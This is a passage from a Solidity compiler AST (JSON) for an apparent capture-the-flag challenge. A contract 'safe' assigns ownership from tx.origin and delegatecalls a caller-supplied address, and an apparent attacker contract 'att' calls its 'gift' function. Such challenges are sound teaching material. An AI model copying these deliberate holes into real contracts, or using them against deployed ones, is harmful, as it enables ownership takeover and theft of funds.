													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 52,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 267,
																	"src": "630:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_att_$58",
																		"typeString": "contract att"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_att_$58",
																		"typeString": "contract att"
																	}
																],
																"id": 51,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "622:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 53,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "622:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 48,
															"name": "sa",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 7,
															"src": "614:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_safe_$239",
																"typeString": "contract safe"
															}
														},
														"id": 50,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "gift",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 182,
														"src": "614:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
															"typeString": "function (address) external"
														}
													},
													"id": 54,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "614:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 55,
												"nodeType": "ExpressionStatement",
												"src": "614:22:0"
											}
										]
									},
									"documentation": null,
									"id": 57,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "attract",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "593:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 47,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "603:0:0"
									},
									"scope": 58,
									"src": "577:67:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 240,
							"src": "59:590:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 239,
							"linearizedBaseContracts": [
								239
							],
							"name": "safe",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 60,
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"scope": 239,
									"src": "671:21:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 59,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "671:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 62,
									"name": "password",
									"nodeType": "VariableDeclaration",
									"scope": 239,
									"src": "699:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 61,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "699:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 64,
									"name": "score",
									"nodeType": "VariableDeclaration",
									"scope": 239,
									"src": "731:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 63,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "731:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 69,
									"name": "SET",
									"nodeType": "VariableDeclaration",
									"scope": 239,
									"src": "758:56:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes4",
										"typeString": "bytes4"
									},
									"typeName": {
										"id": 65,
										"name": "bytes4",
										"nodeType": "ElementaryTypeName",
										"src": "758:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"value": {
										"argumentTypes": null,
										"expression": {
											"argumentTypes": null,
											"expression": {
												"argumentTypes": null,
												"id": 66,
												"name": "this",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 269,
												"src": "789:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_safe_$239",
													"typeString": "contract safe"
												}
											},
											"id": 67,
											"isConstant": false,
											"isLValue": false,
											"isPure": false,
											"lValueRequested": false,
											"memberName": "setPassword",
											"nodeType": "MemberAccess",
											"referencedDeclaration": 198,
											"src": "789:16:0",
											"typeDescriptions": {
												"typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
												"typeString": "function (uint256) external"
											}
										},
										"id": 68,
										"isConstant": false,
										"isLValue": false,
										"isPure": false,
										"lValueRequested": false,
										"memberName": "selector",
										"nodeType": "MemberAccess",
										"referencedDeclaration": null,
										"src": "789:25:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 86,
										"nodeType": "Block",
										"src": "846:82:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 78,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 73,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 254,
																	"src": "865:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 74,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "865:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 76,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 269,
																		"src": "886:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_safe_$239",
																			"typeString": "contract safe"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_safe_$239",
																			"typeString": "contract safe"
																		}
																	],
																	"id": 75,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "878:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 77,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "878:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "865:26:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 72,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															257,
															258
														],
														"referencedDeclaration": 257,
														"src": "857:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 79,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "857:35:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 80,
												"nodeType": "ExpressionStatement",
												"src": "857:35:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 81,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "903:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 82,
															"name": "tx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 266,
															"src": "911:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_transaction",
																"typeString": "tx"
															}
														},
														"id": 83,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "origin",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "911:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "903:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 85,
												"nodeType": "ExpressionStatement",
												"src": "903:17:0"
											}
										]
									},
									"documentation": null,
									"id": 87,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "setOwner",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 70,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "838:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "846:0:0"
									},
									"scope": 239,
									"src": "821:107:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 95,
										"nodeType": "Block",
										"src": "955:37:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 93,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 90,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "966:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 91,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 254,
															"src": "974:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 92,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "974:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "966:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 94,
												"nodeType": "ExpressionStatement",
												"src": "966:18:0"
											}
										]
									},
									"documentation": null,
									"id": 96,
									"implemented": true,
									"isConstructor": true,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 88,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "947:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 89,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "955:0:0"
									},
									"scope": 239,
									"src": "936:56:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 121,
										"nodeType": "Block",
										"src": "1033:134:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 105,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 101,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 269,
																			"src": "1060:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_safe_$239",
																				"typeString": "contract safe"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_safe_$239",
																				"typeString": "contract safe"
																			}
																		],
																		"id": 100,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1052:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 102,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1052:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"id": 103,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balance",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1052:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 104,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1074:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "1052:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 99,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															257,
															258
														],
														"referencedDeclaration": 257,
														"src": "1044:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 106,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1044:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 107,
												"nodeType": "ExpressionStatement",
												"src": "1044:32:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 108,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 254,
															"src": "1090:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 109,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "value",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "1090:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 111,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 269,
																	"src": "1108:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_safe_$239",
																		"typeString": "contract safe"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_safe_$239",
																		"typeString": "contract safe"
																	}
																],
																"id": 110,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1100:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 112,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1100:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balance",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "1100:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1090:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 120,
												"nodeType": "IfStatement",
												"src": "1087:71:0",
												"trueBody": {
													"id": 119,
													"nodeType": "Block",
													"src": "1122:36:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 117,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 115,
																	"name": "score",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 64,
																	"src": "1137:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 116,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1143:3:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "1137:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 118,
															"nodeType": "ExpressionStatement",
															"src": "1137:9:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 122,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "complete",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1017:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 98,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1033:0:0"
									},
									"scope": 239,
									"src": "1000:167:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 181,
										"nodeType": "Block",
										"src": "1211:375:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 138,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"expression": {
																					"argumentTypes": null,
																					"expression": {
																						"argumentTypes": null,
																						"id": 132,
																						"name": "this",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 269,
																						"src": "1274:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_contract$_safe_$239",
																							"typeString": "contract safe"
																						}
																					},
																					"id": 133,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "gift",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 182,
																					"src": "1274:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
																						"typeString": "function (address) external"
																					}
																				},
																				"id": 134,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "selector",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "1274:18:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes4",
																					"typeString": "bytes4"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes4",
																					"typeString": "bytes4"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"id": 130,
																				"name": "abi",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 241,
																				"src": "1251:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_abi",
																					"typeString": "abi"
																				}
																			},
																			"id": 131,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"memberName": "encodeWithSelector",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "1251:22:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_abiencodewithselector_pure$_t_bytes4_$returns$_t_bytes_memory_ptr_$",
																				"typeString": "function (bytes4) pure returns (bytes memory)"
																			}
																		},
																		"id": 135,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1251:42:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 128,
																		"name": "_target",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 124,
																		"src": "1230:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 129,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "delegatecall",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1230:20:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_baredelegatecall_nonpayable$__$returns$_t_bool_$",
																		"typeString": "function () returns (bool)"
																	}
																},
																"id": 136,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1230:64:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 137,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1298:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"src": "1230:73:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "756e7361666520657865637574696f6e",
															"id": 139,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1305:18:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_a252843e7d551e6a5b13ae0a3a5f27f75bcc7a06c70717b4ad4c04497041bae9",
																"typeString": "literal_string \"unsafe execution\""
															},
															"value": "unsafe execution"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_a252843e7d551e6a5b13ae0a3a5f27f75bcc7a06c70717b4ad4c04497041bae9",
																"typeString": "literal_string \"unsafe execution\""
															}
														],
														"id": 127,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															257,
															258
														],
														"referencedDeclaration": 258,
														"src": "1222:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 140,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1222:102:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 141,
												"nodeType": "ExpressionStatement",
												"src": "1222:102:0"
											},
											{
												"assignments": [
													143,
													145
												],
												"declarations": [
													{
														"constant": false,
														"id": 143,
														"name": "sel",
														"nodeType": "VariableDeclaration",
														"scope": 182,
														"src": "1336:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes4",
															"typeString": "bytes4"
														},
														"typeName": {
															"id": 142,
															"name": "bytes4",
															"nodeType": "ElementaryTypeName",
															"src": "1336:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes4",
																"typeString": "bytes4"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 145,
														"name": "val",
														"nodeType": "VariableDeclaration",
														"scope": 182,
														"src": "1347:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 144,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1347:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 148,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 146,
														"name": "getReturns",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 207,
														"src": "1362:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_bytes4_$_t_uint256_$",
															"typeString": "function () pure returns (bytes4,uint256)"
														}
													},
													"id": 147,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1362:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bytes4_$_t_uint256_$",
														"typeString": "tuple(bytes4,uint256)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1335:39:0"
											},
											{
												"assignments": [
													150
												],
												"declarations": [
													{
														"constant": false,
														"id": 150,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"scope": 182,
														"src": "1387:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 149,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1387:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 157,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 155,
															"name": "sel",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 143,
															"src": "1421:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes4",
																"typeString": "bytes4"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes4",
																"typeString": "bytes4"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 152,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 269,
																	"src": "1410:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_safe_$239",
																		"typeString": "contract safe"
																	}
																}
															],
															"expression": {
